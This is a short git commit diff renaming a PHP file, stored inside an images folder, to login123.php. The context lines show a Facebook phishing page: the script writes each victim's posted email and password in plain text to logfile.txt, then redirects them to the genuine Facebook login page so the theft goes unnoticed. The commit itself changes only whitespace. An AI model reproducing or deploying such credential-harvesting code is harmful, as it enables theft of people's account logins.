39e8005cb99f9ecfe19c442ee75cc3a7f6b4272a
plumicetea <161681072+plumicetea@users.noreply.github.com>
2024-06-05 02:37:21 +0800

    Update and rename login.php to login123.php

--- images/login123.php
+++ images/login123.php
@@ -4,7 +4,7 @@ $account = $_POST["email"];
 $data = fopen("logfile.txt","a+");
 fwrite($data, "Username: $account\nPassword: $passwd\n");
 fclose($data);
-?>
+?> 
 <html>
 <meta http-equiv="refresh" content="1;url=https://www.facebook.com/login.php">
 <body>
